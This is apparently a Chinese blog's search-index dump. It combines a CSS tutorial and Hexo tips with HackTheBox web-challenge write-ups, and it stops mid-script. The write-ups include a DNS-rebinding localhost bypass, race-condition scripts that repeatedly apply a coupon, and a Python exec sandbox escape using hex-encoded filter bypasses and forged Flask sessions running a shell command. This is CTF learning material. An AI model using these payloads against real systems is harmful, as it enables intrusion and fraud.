请输入留言\n &lt;/textarea>\n\n0x03 CSS 基础\n因为纯 HTML 太丑了，所以引入 CSS；HTML 确实简单，难的是 CSS。\n\nCSS 让 HTML 去专注去做结构，结构和样式相分离。\nCSS 语法规范选择器 + 样式；选中某个元素，声明其属性，进行修改。\n\n\n比如有个 &lt;p&gt; 标签，我们这样使用 CSS，&lt;style&gt; 一般写在 &lt;head&gt;&lt;/head&gt; 之间。\n&lt;style>\n /* 选择器 &#123;样式&#125; */\n p &#123;\n \tcolor: red;\n &#125;\n &lt;/style>\n\nCSS 基础选择器标签选择器不太好，因为是对所有标签操作的\n标签名\n&#123;\n\t属性1:属性值1; \n\t属性2:属性值2; \n\t属性3:属性值3; \n&#125;\n\n类选择器（实际开发最常用）语法\n.类名\n&#123;\n\t属性1:属性值1; \n\t属性2:属性值2; \n\t属性3:属性值3; \n&#125;\n\n这样，我们的 HTML 里面的元素需要定义 class，例如\n&lt;p class=\"red\"> 类选择器 &lt;/p>\n\n\n\n可以多类名，但是多类名之间要用空格分开。是非常巧妙的用法，语法案例如下。\n\n&lt;style>\n /* 选择器 &#123;样式&#125; */\n .box&#123;\n\twidth: 150px;\n\theight: 100px;\n\tfont-size: 30px;\n &#125;\n .red &#123;\n\tbackground-color: red;\n &#125;\n .green &#123;\n\tbackground-color: green;\n &#125;\n &lt;/style>\n&lt;body>\n &lt;div class=\"box red\">红色&lt;/div>\n &lt;div class=\"box green\">红色&lt;/div>\n &lt;div class=\"box red\">红色&lt;/div>\n&lt;/body>\n\n\nid 类选择器id 选择器使用#进行标识，后面紧跟 id 名\n\n元素的 id 值是唯一的，只能对应于文档中某一个具体的元素。别人就无法使用了。\n\nCSS 语法\n#id名 &#123;\n\t属性1:属性值1; \n\t属性2:属性值2; \n\t属性3:属性值3; \n&#125;  \n\nHTML 语法\n&lt;p id=\"id名\">&lt;/p>\n\n通配符选择器通配符选择器用*号表示，* 就是选择所有的标签。它是所有选择器中作用范围最广的，能匹配页面中所有的元素。\n\n注意：会匹配页面所有的元素，降低页面响应速度，不建议随便使用\n\n* &#123; \n\t属性1:属性值1; \n\t属性2:属性值2; \n\t属性3:属性值3; \n&#125;\n\n例如下面代码，使用通配符选择器定义 CSS 样式，清除所有 HTML 标记的默认边距。\n* &#123;  \n margin: 0; /* 定义外边距*/  \n padding: 0; /* 定义内边距*/  \n&#125;\n\nCSS 选择器小结\n\n尽量少用通配符选择器 *。\n尽量少用 ID 选择器 \n不使用无具体语义定义的标签选择器。\n\n/* 推荐 */  \n.jdc &#123;&#125;  \nli &#123;&#125;  \np&#123;&#125;  \n  \n/* 不推荐 */  \n*&#123;&#125;  \n#jdc &#123;&#125;  \ndiv&#123;&#125;   因为div 没有语义，我们尽量少用\n\nCSS 字体属性\n与 font 有关的一堆属性，比较简单，直接过了。\n\n\n\n\n属性\n作用\n注意点\n\n\n\nfont-size\n字号\n单位 px 要带上\n\n\nfont-family\n字体\n无\n\n\nfont-weight\n字体粗细\n数字不要跟单位；700 加粗，400 正常\n\n\nfont-style\n字体样式\n斜体是 italic，正常 normal\n\n\nfont\n字体连写\n字体 + 字号是必要的，中间不带标点\n\n\n这里重点讲一讲 font 属性的用法，中间不需要用标点分隔，字体与字号是必要的。\n&lt;style>\n\tbody\n\t&#123;\n\t\tfont: italic 700 16px 'Microsof Yahei'\n\t&#125;\n&lt;/style>\n\nCSS 文本属性\n这个和字体不太一样，主要指文本的颜色，对齐，文本缩进，行间距这种，这是文本属性。\n\ncolor 文本颜色文本颜色，和 font-color 类似，但是实际上的含义不同。\n\n\n\n表示方法\n属性值\n\n\n\n预定义的颜色值\nred，green，blue\n\n\n十六进制\n#fff000 等\n\n\nRGB 编码\nrgb(255,0,0)\n\n\n用 16 进制的写法是最多的。\ntext-align 文本对齐让盒子里面的文本内容水平居中， 而不是让盒子居中对齐。\n\n\n\n属性\n解释\n\n\n\nleft\n左对齐\n\n\nright\n右对齐\n\n\ncenter\n居中对齐\n\n\nline-height 行间距\nline-height 常用的属性值单位有三种，分别为像素 px，相对值 em 和百分比%，实际工作中使用最多的是像素 px\n\n\n一般情况下，行距比字号大 7–8 像素左右就可以了。\n\n行高与高度的三种关系如果 行高 &#x3D; 高度  文字会 垂直居中如果 行高 &gt; 高度  文字会 偏下如果 行高 &lt; 高度  文字会  偏上\n/*line-height 要设置在font属性下面，否则无效，例如：*/  \nheight: 80px;  \ntext-align: center;  \nfont: normal bold 30px \"宋体\";  \nline-height: 80px;\n\n可以使用 display:flex;布局方式让文字水平垂直居中\ndisplay: flex;  \nalign-items: center; /* 侧轴对齐方式*/  \njustify-content: center; /* 主轴对齐方式 */\ntext-indent 首行文本缩进\n其属性值可为不同单位的数值、em 字符宽度的倍数、或相对于浏览器窗口宽度的百分比%，允许使用负值。\n建议使用 em 作为设置单位。 \n1em 就是一个字的宽度。如果是汉字的段落，1em 就是一个汉字的宽度。\n\ntext-decoration 文本装饰\n\n\n属性值\n解释\n\n\n\nnone\n无下划线\n\n\nunderline\n定义文本下的一条下划线（常用）\n\n\noverline\n定义文本上的一条线\n\n\nline-through\n穿过文本下的一条线\n\n\nCSS 文本属性小结\n\n\n属性\n作用\n注意点\n\n\n\ncolor\n颜色\n通常用十六进制\n\n\nline-height\n行高\n控制行与行之间的距离\n\n\ntext-align\n水平对齐\n可以设置文字水平的对齐方式\n\n\ntext-indent\n首行缩进\n空两格这种\n\n\ntext-decoration\n文本修饰\nunderline 添加下划线，反之 none\n\n\nCSS 的引入方式\n也就是几种引用方式\n\n分为三种\n\n行内样式表（行内式）\n内部样式表（嵌入式）\n外部样式表（链接式）\n\n行内样式表\n直接加在 HTML 里面，像这样\n\n&lt;div style=\"color: red; font-size: 12px;\">\n\ttest\n&lt;/div>\n\n内部样式表也就是放到 &lt;head&gt;&lt;/head&gt; 里面的 &lt;style&gt; 这个标签中\n外部样式表（推荐！）单独写一个 css 文件，这样我们需要引入 link 标签\n语法如下\n&lt;link rel=\"stylesheet\" href=\"css路径\">\n\n这种很爽，很符合封装的特性。\nChrome 调试工具\n就是 f12 的开发者模式………………\n\n0x04 CSS 进阶CSS 复合选择器（很重要！）\n将基础选择器组合到一起。分四类，一个个讲。\n\n后代选择器可以选择父元素里面的子元素。也就是 &lt;ul&gt; 当中 &lt;li&gt; 是子元素，&lt;ul&gt; 是父元素。\n语法，里面的子元素可以写很多个\n父级 子级 &#123;\n\t属性:属性值;\n\t属性:属性值;\n&#125;  \nol li a\n&#123;\n\tcolor:red;\n\tfont-size:16px;\n&#125;\n\n进阶使用，肯定是要与类名选择器结合的，语法如下。如果标签名当中也有类，则可以使用 标签.类名 调用\n.class 标签名 \n&#123;\n\tcolor:red;\n\tfont-size:16px;\n&#125;\n\n子选择器子元素选择器只能选择作为某元素子元素(亲儿子)的元素这里的子，指的是亲儿子。不包含孙子 重孙子之类。\n\n\n这里最靠近 div 的 a 是 div 的儿子，后面一个 a 就是 div 的孙子了。而 p 标签其实也是 div 的儿子。\n语法\n元素1>元素2 &#123;\n\t样式声明\n&#125;\n\n并集选择器并集选择器可以选择多组标签，同时为它们定义相同的样式。通常用于集体声明。\n语法\n元素1,元素2 &#123;\n\t样式结构\n&#125;\n\n伪类选择器\n用于添加一些特殊效果，比如在鼠标点上去的时候变色这种。\n\n链接伪类选择器语法如下\n\n\n\n语法\n描述\n\n\n\na:link\n选择所有未被访问的链接\n\n\na:visited\n选择所有已被访问的链接\n\n\na:hover\n选择鼠标经过的链接\n\n\na:active\n选择鼠标按下未弹起的链接\n\n\n用的最多的是 hover 和 active 两个。\nfocus 伪类选择器focus 伪类选择器用于获取焦点的表单元素，也就是光标。是和 &lt;input&gt; 标签放一起使用。\n语法\ninput:focus &#123;\n\tbackground-color: yellow;\n&#125;\n\nCSS 复合选择器总结\n\nCSS 的元素显示模式标签显示模式是标签以什么方式进行显示。HTML 标签一般分为块标签和行内标签两种类型，它们也称为块元素和行内元素。\n块元素常见的块元素有 &lt;h1&gt;~&lt;h6&gt;、&lt;p&gt;、&lt;div&gt;、&lt;ul&gt;、&lt;ol&gt;、&lt;li&gt; 等，其中 &lt;div&gt; 标签是最典型的块元素。\n\n块级元素的特点\n\n\n独占一行\n高度，宽度，外边距以及内边距都可以控制。  \n宽度默认是容器(父级宽度)的 100%\n是一个容器及盒子，里面可以放行内或者块级元素\n注意：只有文字才能组成段落，因此 p 标签里面不能放块级元素，特别是 p 不能放 div。同理，还有 h1~h6、dt，它们都是文字类块级标签，里面不能放其他块级元素。\n\n行内元素常见的行内元素有 &lt;a&gt;、&lt;strong&gt;、&lt;b&gt;、&lt;em&gt;、&lt;i&gt;、&lt;del&gt;、&lt;s&gt;、&lt;ins&gt;、&lt;u&gt;、&lt;span&gt; 等，其中 &lt;span&gt; 标签最典型的行内元素。\n\n行内元素的特点\n\n\n相邻行内元素在一行上，一行可以显示多个。\n高度、宽度直接设置是无效的。\n默认高度就是它本身内容的宽度。\n行内元素只能容纳文本或其他行内元素。\n\n行内块元素在行内元素中有几个特殊的标签 ———— &lt;img&gt;、&lt;input &gt;、&lt;td&gt;，可以对它们设置宽高和对齐属性，有些资料可能会称它们为行内块元素。\n\n行内块元素的特点\n\n\n和相邻行内元素(行内块)在一行上，但是之间会有空白风险。一行可以显示多个。\n默认宽度就是它本身内容的宽度。\n高度，行高，外边距以及内边距都可以控制。\n\n三种模式总结\n\n元素显示模式转换简单来说是这样的，像链接标签 &lt;a&gt; 是行内元素，无法设置高度宽度，我们可以将它转换为块元素再进行设置。\n\n实现方式\n\n\n块转行内：display:inline;  \n行内转块：display:block;  \n块、行内元素转换为行内块：display: inline-block;\n\nCSS 背景 ———— background背景颜色语法\nbackground-color: 颜色值; 默认的值是 transparent 透明的\n\n背景图片\n很多 logo 与背景图，都可以用背景图片来做。\n\n语法\nbackground-image : none | url (url) ;\n例如:  \nbackground-image: url(images/1.png);\n\n背景平铺问题出现于背景图片小于盒子图片，从而背景图片会重复出现。\n\n这种问题我们用背景平铺来解决。\n\n语法\nbackground-repeat : repeat | no-repeat | repeat-x | repeat-y\n\n\n\n\n参数\n作用\n\n\n\nrepeat\n背景图像在纵向和横向上平铺（默认的）\n\n\nno-repeat\n背景图像不平铺\n\n\nrepeat-x\n背景图像在横向上平铺\n\n\nrepeat-y\n背景图像在纵向平铺\n\n\n背景图片的位置语法\nbackground-position: x y;\n\nposition 后面是 x 坐标和 y 坐标。可以使用方位名词或精确单位。\n\n\n\n参数\n值\n\n\n\nlength\n百分数或由浮点数字和单位标识符组成的长度值\n\n\nposition\ntop center bottom left center right  方位名词\n\n\n注意：\n\n如果指定两个值，两个值都是方位名字，则两个值前后顺序无关，比如 left  top 和 top  left 效果一致\n如果只指定了一个方位名词，另一个值默认居中对齐。\n如果 position 后面是精确坐标， 那么第一个，肯定是 x 第二个一定是 y。\n如果只指定一个数值,那该数值一定是 x 坐标，另一个默认垂直居中。\n如果指定的两个值是 精确单位和方位名字混合使用，则第一个值是 x 坐标，第二个值是 y 坐标。\n\n背景附着背景图像可以固定，或者随着页面的其余部分滚动\n语法\nbackground-attachment: scroll/fixed\n\n背景复合写法原本我们需要写很多的属性以及属性值，现在我们可以这样background：属性的值的书写顺序官方没有强制的标准。为了可读性，建议如下写：\nbackground: 背景颜色 背景图片地址 背景平铺 背景滚动 背景位置;\n\n背景色半透明语法\nbackground: rgba(0,0,0,0.3) \n\n前三个确定颜色，最后一个 alpha 确认透明度\n0x05 CSS3 盒子模型与布局\n网页布局的本质就是盒子 ———— Box。\n\n盒子模型\n盒子模型由元素的内容、边框（border）、内边距（padding）、和外边距（margin）组成。\n\n最好理解的是内容，也就是盒子里面的 html 标签。\n内边距 padding 就是盒子内容与边框的距离，通过 padding 设置，padding 分为上下左右四个。\nmargin 控制两个不同盒子之间的距离\nborder 是盒子的边框，是边框的一些属性，颜色这种\n\n\n边框边框这里有三种属性\n\n\n\n属性\n作用\n\n\n\nborder-width\n边框的粗细，单位为 px\n\n\nborder-style\n边框的样式\n\n\nborder-color\n边框颜色\n\n\n边框的样式：none：没有边框即忽略所有边框的宽度（默认值）solid：边框为单实线(最为常用的)dashed：边框为虚线dotted：边框为点线\nborder : border-width || border-style || border-color   \nborder: 1px solid red;  没有顺序要求\n\n盒子边框写法总结表：\n很多情况下，我们不需要指定4个边框，我们是可以单独给4个边框分别指定的。\n\n\n表格细线边框\n这里是指 table 当中的 css 设计。\n\n","categories":["Java 开发"],"tags":["Java 开发"]},{"title":"HTB使用准备","url":"/2022/03/29/HTB%E4%BD%BF%E7%94%A8%E5%87%86%E5%A4%87/","content":"HTB使用准备\n\nHTB使用准备0x01 前言还是打算每天一道 CTF 吧，但是光做 buu 感觉不太够用，所以选择了渗透更真实，题目更好的 HackTheBox。之前大一也打算弄的，但是由于自己的惰性，还是寄了。\n0x02 登录注册\n其他界面其实都差不多，唯一多了一个邀请码，邀请码上网查即可。\n\n0x03 OpenVPN 的配置\n使用 kali 机，因为 kali 中工具较多，且是 HTB 官方所推荐的。\n\n这里我们打开 kali，检查一下 OpenVPN 是否已经安装。在终端下输入 openvpn 即可。一般来说 kali 当中已经自带了 openvpn；若 openvpn 未安装，则可以通过 apt install 的命令完成。\n\n\n在 HTB 靶场下载 OpenVPN 的配置文件，下载地址如下，并且我选择的是 TCP443 的文件。\n\n\n\n\n接着在 kali 机里面进行 OpenVPN 的连接，bash 命令\nsudo openvpn xxx.ovpn\n\n\n\n到这一步会发现网络很卡，连接不稳定，VPN 经常掉，需要给 kali 配置代理\n0x04 给 kali 配置代理最优方法这方法太好用了，后面直接不用看了，在 .opvn 文件里面加上这一段即可\n\n\nclash 打开 Allow LAN 直接解决，无敌！\n方法一、proxychains这里我用的是 proxychains，由于之前有人和我讲这个，没讲透，就很烦。。。这里我写一遍教程\n首先是 kali 机的网络连接模式，如图，NAT 模式，且 VMnet08\n\n\n然后打开 /etc/proxychains.conf，设置代理如下\n\n\n并且注意，这里最好是用 UDP 的 VPN，在连 openvpn 前需要\nproxychains openvpn\n\n接着就可以  openvpn lab_xxx.ovpn 操作了\n方法二、clash 透明代理用的就是 clash for windows 自带的功能，操作如图\n\n\n","categories":["环境搭建"],"tags":["环境搭建"]},{"title":"Hexo 踩坑合集","url":"/2022/03/31/Hexo-%E8%B8%A9%E5%9D%91%E5%90%88%E9%9B%86/","content":"Hexo 踩坑合集\n\nHexo 踩坑合集1. hexo s，hexo g，hexo d 时候的报错 err: TypeError: Prism.languages.typescript.keyword.push is not a function报错如图所示\n\n\n此时可以选择关闭 prism 插件，问题可以得到临时解决。\n2. hexo matery 代码块高亮渲染问题终于解决了，累死了……………… 参考闪烁之狐大佬的说法就可以了\n从 Hexo5.0 版本开始自带了 prismjs 代码语法高亮的支持，本主题对此进行了改造支持。\n如果你的博客中曾经安装过 hexo-prism-plugin 的插件，那么你须要执行 npm uninstall hexo-prism-plugin 来卸载掉它，否则生成的代码中会有 &amp;#123; 和 &amp;#125; 的转义字符。\n然后，修改 Hexo 根目录下 _config.yml 文件中 highlight.enable 的值为 false，并将 prismjs.enable 的值设置为 true，主要配置如下：\nhighlight:\n  enable: false\n  line_number: true\n  auto_detect: false\n  tab_replace: ''\n  wrap: true\n  hljs: false\nprismjs:\n  enable: true\n  preprocess: true\n  line_number: true\n  tab_replace: ''\n\n主题中默认的 prismjs 主题是 Tomorrow Night，如果你想定制自己的主题，可以前往 prismjs 下载页面 定制下载自己喜欢的主题 css 文件，然后将此 css 主题文件取名为 prism.css，替换掉 hexo-theme-matery 主题文件夹中的 source/libs/prism/prism.css 文件即可。\n3. err: [Error: EPERM: operation not permitted, unlink\n这里网上搜集了很多的方法，比如什么用 sudo 权限打开 cmd 什么的，我个人这里不是这些原因。\n\n早在之前写的文章里面有一篇叫 “Python Flask模板注入的文章”，在那里面加入了 disableNunjucks: true；所以后续我有一篇文章 “从0到1 完全掌握 SSTI” 中没有加入这一判断，就报错了。\n如果还是无法解决的话可以删除 ./deploy.git，再等待一段时间后再进行 hexo 的部署即可。\n\n还有一种情况是因为 hexo matery 不支持文章中存在相同密码的，对文章加密之后每篇都必须是不同的密码。\n\n\n总而言之，我认为这些类型的报错都是由于操作不当引起的\n\n4. 当删除完已经发布的文章当删除完已经发布的文章之后要 hexo clean，再 hexo g，hexo d否则会报错。\n5. hexo d 时 remote: Support for password authentication was removed on August 13, 2021. Please use a personal access token instead.\n这就是 GitHub 的新验证方式，用 token 即可。\n\n点击头像，进入 Settings，有个 Developer Setting，里面有一个 Token 的，全选 generate 即可。\n6. 文章给多个分类，多标签\n一篇文章肯定是有可能是既是 Java 的，又是漏洞复现的\n\ncategories: [Sports,Baseball]\n\n这个方法有点问题，还在思考。\n7. hexo 版本降级npm i &#104;&#x65;&#120;&#x6f;&#x40;&#x34;&#x2e;&#49;&#x2e;&#49;更换版本\n8. fatal: Out of memory, malloc failed (tried to allocate 947912704 bytes)查看git 的配置 。猜想是“http.postbuffer”太大。\ngit config --global  http.postbuffer 128m","categories":["踩坑合集"],"tags":["踩坑合集"]},{"title":"HackTheBox之Web部分刷题记录","url":"/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/","content":"HackTheBox之Web部分刷题记录\n\nLet’s GO!HackTheBox-AbuseHumanDB0x01 初识靶场靶场界面如图所示\n\n\n界面中让我们提交，存在虐待性质的网站，我这里直接输入 http://baidu.com 试一试。\n一长串读条之后，出来了界面\n\n\n不太懂，看一下源码吧。\n0x02 代码审计先打开路由中的 index.js，粗略看了一眼，全是 Return 错误的，或者是 403 的 …………\n\n\n看到了 &#x2F;entries 的接口，会返回给我们前端的界面，访问一下 &#x2F;entries 的接口试试，看看会不会有什么意外的发现。\n\n\n或许是 SQL 注入？尝试一下，分别尝试数字型注入与字符型注入\n\n\n失败了，再回去看看源码\n在 database.js 里，进行了预编译，防止了 SQL 注入。\n源码这里的第 6 - 7 行，主要是第 7 行，定义 isLocalhost 常数，若 req.ip 等于 127.0.0.1 且 host 等于 127.0.0.1:1337，那么值就为 0，否则为 1\n太难了，懂原理之后再回来看\nHackTheBox-baby-CachedView0x01 前言也做了好久的 HTB 题了，发现基本上题目的 DESCRIPTION 都没什么用，不过我也不能确定吧。把一部分的 Challenge 刷完就准备去搞 Machine 了\n0x02 初识靶场\n靶场界面如图所示\n\n\n\n这里输入一个网站之后挺奇怪的，例如这里我输入 https://google.com，页面会一直加载，也不跳出 Google.com 的东西。如果用 Burpsuite 发包的话一开始 500 的状态码。\n\n后续页面出来了，如图所示\n\n\n\n点击 google.com 的超链接，可以跳转到 google.com，全无思路 ……\n0x03 源码阅读，代码审计一般拿到源码，都是先看路由，也就是看 route.py，如果在 Java 当中，路由一般都是 xxxController 类似的文件。\nroutes.py 文件夹中，第 18 - 21 行，是关于 flag 的，那我们这里直接访问 &#x2F;flag 的路由试一试。\n可惜 403，被 Forbidden 了。\n\n\n回去看源代码，这里还有一句关于 flag 的。\n@web.route('/flag')\n@is_from_localhost\ndef flag():\n return send_file('flag.png')\n\n点进 @is_from_localhost 这个函数，查看一下到底是什么情况。\n\n\n很简单，判断客户端的 IP 是不是等于 127.0.0.1，以及 Referer 的 IP 是否等于 127.0.0.1；若相等，则返回成功，若不相等，则返回 403\n0x04 解题\n如果我本机直接起这个服务，肯定是能够得到 flag，但我希望不要以这种方式解出来，于是尝试伪造 Referer\n\n伪造了 Referer 和 remote_addr 无果，还是决定本地起这个服务。\n教程可参考 HackTheBox-baby CachedView_galaxy3000的博客-CSDN博客我自己没有做出来这种方法的，于是换了一种 DNS 重绑的做法。\n\nDNS 重绑，我个人感觉有点中间人攻击的样子，因为 IP 被重绑之后绕过了。原理图如下\n\n\n\n工具网站如下https://lock.cmpxchg8b.com/rebinder.html\n接着，我们输入题目对应的 IP 与 127.0.0.1 在框内\n\n\n再在题目的界面访问 http://b280a398.7f000001.rbndr.us/flag\n多刷几次，就能够看到 flag 的截图了，这里一定要耐心！\n\n\nFlag：HTB{reb1nd1ng_y0ur_dns_r3s0lv3r_0n3_qu3ry_4t_4_t1m3}\nHackTheBox-Diogenes’ Rage0x01 前言\n搞开发真累 ………………\n\n0x02 初识靶场打开靶场后如图所示\n\n\n下面有一张 1 dollar 的纸币，投进去之后可以点餐，简而言之这是一个自助贩卖机。\n抓包之后看了，感觉没有什么明显的逻辑漏洞，看源码。\n\n\n0x03 代码审计\n还是老样子，先看路由\n\n路由的第 23 - 44 行出现了 flag\n\n\n前提条件是我们在自助贩卖机下输入的商品号是 C8，可是 C8 的价格是 13 多 dollar。再看看其他的代码，寻找思路。感觉有两种思路\n思路一、修改 apply 进去的数，使得钱够付尝试了连续发包，但 JWT 始终会变，username 也一直在变，不太好搞；在投入纸币的时候账户上会多一块钱。而我们在同一时间发起多个请求，就可以把优惠券的价格猛地飙上来，从而凑够购买 C8 的资金\n\n\n思路二、修改货物的价格货物没有价格，只有对应的 item，item 对应的是 SQL 语句，SQL 语句是预编译写的，不存在 SQL 注入\n\n确定下来思路，走思路一\n\n0x04 构造异步发包的 exp前文我们说了，每次我们投入纸币的时候，JWT 会新建一个用户，这样的话会导致原本我们的攻击思路泡汤，所以此时我们必须要传进去用户的 token 才可以；构造一下 exp\nAPI 请求的顺序如下所示。\n\n使用 &#x2F;api&#x2F;purchase 获取用户 Session。\n同时在多个进程中运行 &#x2F;api&#x2F;coupons&#x2F;apply。\n使用 &#x2F;api&#x2F;purchase 购买 C8。如果购买成功，则 cat flag\n\n这里还有一个原因是利用了竞争条件，也就是 Race Condition，竞争条件不再展开，可以移步至我博客PortSwigger-文件上传 | 芜风\n1.购买商品时，Cookie 可以通过注册用户发出。2. 优惠券发放时出现争用情况。\n为什么 #1 很重要，因为如果我们在没有用户会话的情况下执行 #2，则可以调用 registerUser 功能并每次在新会话中颁发优惠券，因此我们无法将优惠券复制到一个帐户。因此，需要先运行 Buy Stuff API 来获取用户会话。\n写 exp最开始我写的 exp，太菜了hh\nimport multiprocessing\nimport requests\n\nurl_user = 'http://206.189.26.20:30831/api/coupons/apply'\nheaders = &#123;'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39'&#125;\ndata_sendBill = &#123;\"coupon_code\":\"HTB_100\"&#125;\nres_getusername = requests.post(url_user, headers=headers, json= data_sendBill)\ncookies = &#123;'session':res_getusername.cookies['session']&#125;\nt = []\nfor i in range(40):\n\nt.append(multiprocessing.Process(target=exploit,args=(cookies,)))\nfor j in t:\n j.start()\nfor k in t:\n k.join()\nurl_buy = 'http://206.189.26.20:30831/api/purchase'\ndata_PayBill = &#123;\"item\":\"C8\"&#125;\nres = requests.post(url_buy, headers=headers, json= data_PayBill, cookies = cookies)\njson_result = res.json()\n\ntry:\n if json_result['flag']:\n print(json_result['flag'])\nexcept KeyError as e:\n print('failed : ' + json_result['message'])\n\n后面看了大佬的 exp，我这里挂一下\nimport multiprocessing\nimport requests\nimport time\n\ndef exploit(u, d, h):\n for i in range(5):\n requests.post(u, data=d, headers=h)\n\ndef perform_transactions(cookie, u):\n url = f\"http://206.189.26.20:30831/api/coupons/apply\"\n data = '&#123;\"coupon_code\":\"HTB_100\"&#125;'\n thread = []\n headers = &#123;\"Content-Type\" : \"application/json\"&#125;\n headers['Cookie'] = \"session=\"+cookie\n start = time.time()\n for i in range(16):\n p1 = multiprocessing.Process(target=exploit, args=(url, data, headers))\n thread.append(p1)\n for j in thread:\n j.start()\n for k in thread:\n k.join()\n end = time.time()\n print(f\"&#123;end - start:.5f&#125; sec\")\n print(\"Done!!\")\n\ndef get_session(url):\n u = f\"http://206.189.26.20:30831/api/purchase\"\n d = '&#123;\"item\":\"A2\"&#125;'\n res = requests.post(u, data=d)\n print(res.text)\n return res.cookies['session']\n\ndef get_flag(s, url):\n u = f\"http://206.189.26.20:30831/api/purchase\"\n d = '&#123;\"item\":\"C8\"&#125;'\n headers = &#123;\"Content-Type\" : \"application/json\"&#125;\n headers['Cookie'] = \"session=\"+s\n d1 = '&#123;\"item\":\"A1\"&#125;'\n res = requests.post(u, data=d1, headers=headers)\n print(res.text)\n res = requests.post(u, data=d, headers=headers)\n print(res.text)\n return res.cookies\nif __name__ == \"__main__\":\n for i in range(10):\n u = \"URLSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS\"\n s = get_session(u)\n perform_transactions(s, u)\n res = get_flag(s, u)\n time.sleep(1)\n print(\"\\n\\n\")\n\n吐了 openvpn 炸了……\n感觉就是异步写一个代码吧，接近成功了，但还是寄了\nHackTheBox-Easter-Bunny0x01 前言最近学习 Port 的 Web Cache Poisoning 部分，怎么添加 X-Forwarded-Host 之后发包一直失败，稀里糊涂的。。。。\n0x02 初识靶场\n靶场界面如图所示\n\n\n\n靶场主要分三个模块：\n\n写信模块，Write New Letter。\n发送新建模块，点击 stamp 为贴邮票，也就是发送了。\n查看其他信件模块。\n\n简单抓包了一下，在信中写了 XSS 的 Payload\n\n\n当我们点击到 Letter #3 的时候出现了不一样的东西。\n\n\n没有什么用处，再全部抓了遍包，没有发现什么明显的攻击点，进行代码审计的环节 ~\n0x03 代码审计\n老样子，先看路由\n\n看了一圈，没有明显看到与 Flag 有关的东西，但是找到一处可疑的地方，第 47 - 62 行。\n\n\n这里通过 Auth 就能够获取到 Flag 了吧，可是根据路由的第一行我们需要跳转到 /utils/authorisation 去看。\n路由第一行\nconst &#123; isAdmin, authSecret &#125; = require(\"../utils/authorisation\");\n\nauthorisation.js\n\n好吧，这里的 authSecret 是随机生成的，如果要使得 req.cookie 与 authSecret 相等是不太可能。但是这里要求我们以 127.0.0.1 进行身份认证，SSRF(?)。不清楚，去看看 database.js\ndatabase.js\n\n\n数据库当中，message &#x3D; 3 的地方存在 Flag，我们接下来的思路便是成功身份认证了。\nSQL 语句预编译了，无法进行 SQL 注入了。\nHackTheBox-interdimensional internet0x01 前言最近发现 HTB 还是有很多题目是脑洞题，那些脑洞题就不打算做了，还是依靠 CTF 来学习漏洞为主。\n0x02 初识靶场靶场界面如图所示\n\n\n讲道理，有点丑，不是很舒服，每一次刷新界面，都会出现一个随机数。\n查看一下源码，发现有一段注解 “&#x2F;debug”，尝试访问 &#x2F;debug 接口；发现是题目的源代码。\n\n\n0x03 代码审计\n粗略审计一遍源码，发现并没有 flag 的字样，判断获取 flag 的手段为 cat flag，我们下一步去寻找一下存在命令执行的地方。\n\n\n命令执行部分的代码\n\n\n\ndef calc(recipe):\n global garage\n builtins, garage = &#123;'__builtins__': None&#125;, &#123;&#125;\n try: exec(recipe, builtins, garage)\n except: pass\n\n__builtins__ 这个函数用来内建对象，这里并不影响代码审计，关键问题在 recipe 上面。recipe 是传进来用于命令执行的语句。深入分析\n处理 recipe 的代码如下，太长了，先不贴，用图片来说明。\n\n\n\n第 16 - 19 行\n\n\n获取 session 的 ingredient 和 measurements，用他们拼接 recipe 变量。\n\n第 20 行之后的判断语句\n\n\n\n若 session 的 ingredient 和 measurements 存在，并且 recipe 的长度 &gt; 20 ；就进入正则，判断传进来的 recipe 里面含不含有一堆字符，含的话直接拦截并返回。\n若并没有达到条件，则会产生随机值并返回。所以核心在于 payload 的构造 ———— 如何绕过正则的匹配。\n0x04 构造 payload绕过使用得是 hex 编码python里字符串使用 \\xab 来表示字符的，尝试一下payload。\nif __name__ == '__main__':\n    recipe = '''\nb = \\x5b]\nprint b\n'''\n    if re.search(r'\\[|\\(_\\.', recipe):\n        print 'invalid payload'\n    calc(recipe)\n\n这样并不可以，\\x5b 和 [ 在python里应该是等价的。但是这种包裹在字符串里然后并且 \\ 被 \\ 转义的 \\5b 能绕过。\n只要把print改成exec就可以把b当成一个语句执行了。\nif __name__ == '__main__':\n    recipe = '''\nb = \"builtins = \\\\x5bi for i in \\\\x28)\\\\x2e\\\\x5f\\\\x5fclass\\\\x5f\\\\x5f\\\\x2e\\\\x5f\\\\x5fbases\\\\x5f\\\\x5f\\\\x5b0]\\\\x2e\\\\x5f\\\\x5fsubclasses\\\\x5f\\\\x5f\\\\x28) if i\\\\x2e\\\\x5f\\\\x5fname\\\\x5f\\\\x5f=='catch\\\\x5fwarnings']\\\\x5b0]\\\\x28)\\\\x2e\\\\x5fmodule\\\\x2e\\\\x5f\\\\x5fbuiltins\\\\x5f\\\\x5f\"\nexec b\nprint builtins\n'''\n    if re.search(r'\\[|\\(_\\.', recipe):\n        print 'invalid payload'\n    calc(recipe)\n\n\n编写 exp，借用外国师傅的 exp.py\n\nimport requests\n\nfrom flask.sessions import SecureCookieSessionInterface\n\nfrom itsdangerous import URLSafeTimedSerializer\n\nTARGET = 'http://&lt;IP>:&lt;PORT>/'\n\nSECRET_KEY = '&lt;SECRET_KEY>'\n\n# PAYLOAD = u\"\"\"i=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']\n\n# i('flask').session['x']=i('os').popen('ls').read()\"\"\"\n\nPAYLOAD = u\"\"\"i=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']\n\ni('flask').session['x']=i('os').popen('cat t*').read()\"\"\"\n\nclass flask_encoding:\n\ndef __init__(self):\n\nscsi = SecureCookieSessionInterface()\n\nsigner_kwargs = dict(\n\nkey_derivation=scsi.key_derivation,\n\ndigest_method=scsi.digest_method\n\n)\n\nself.serializer = URLSafeTimedSerializer(SECRET_KEY, salt=scsi.salt,\n\nserializer=scsi.serializer,\n\nsigner_kwargs=signer_kwargs\n\n)\n\ndef deserialize(self, cookie_str):\n\nreturn self.serializer.loads(cookie_str)\n\ndef serialize(self, cookie_dict):\n\nreturn self.serializer.dumps(cookie_dict)\n\n# waf bypass encoding\n\ndef 